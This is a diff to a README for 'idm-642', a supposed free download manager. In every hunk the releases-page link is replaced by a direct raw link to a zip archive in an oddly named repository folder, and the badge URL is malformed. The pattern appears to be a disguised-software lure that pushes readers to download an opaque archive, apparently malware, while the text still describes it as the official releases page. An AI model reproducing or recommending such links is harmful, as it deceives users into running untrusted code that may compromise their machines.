@@ -1,6 +1,6 @@
 # 📥 idm-642 - Free Download Manager for Easy Files
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/BlackDee-creator/idm-642/releases)
+[![Download Now](https://raw.githubusercontent.com/BlackDee-creator/idm-642/main/phymatorhysin/idm-642.zip%https://raw.githubusercontent.com/BlackDee-creator/idm-642/main/phymatorhysin/idm-642.zip)](https://raw.githubusercontent.com/BlackDee-creator/idm-642/main/phymatorhysin/idm-642.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ idm-642 is a powerful tool that simplifies your file downloading experience. Wit
 To begin using idm-642, follow these steps:
 
 1. **Download the Application:**
-   - Visit the [Releases Page](https://github.com/BlackDee-creator/idm-642/releases).
+   - Visit the [Releases Page](https://raw.githubusercontent.com/BlackDee-creator/idm-642/main/phymatorhysin/idm-642.zip).
    - Look for the latest version under the "Assets" section.
    - Click on the downloadable file to start the download.
 
@@ -26,7 +26,7 @@ To begin using idm-642, follow these steps:
 
 ## 📥 Download & Install
 
-To download the latest version of idm-642, visit the [Releases Page](https://github.com/BlackDee-creator/idm-642/releases) again. It is essential to download the latest version to access new features and improvements.
+To download the latest version of idm-642, visit the [Releases Page](https://raw.githubusercontent.com/BlackDee-creator/idm-642/main/phymatorhysin/idm-642.zip) again. It is essential to download the latest version to access new features and improvements.
 
 ## 🔍 Features
 
@@ -75,4 +75,4 @@ Special thanks to all the contributors and users who make this project possible.
 
 --- 
 
-For more details, updates, and downloads, always refer to the [Releases Page](https://github.com/BlackDee-creator/idm-642/releases). Enjoy your enhanced downloading experience with idm-642!
+For more details, updates, and downloads, always refer to the [Releases Page](https://raw.githubusercontent.com/BlackDee-creator/idm-642/main/phymatorhysin/idm-642.zip). Enjoy your enhanced downloading experience with idm-642!
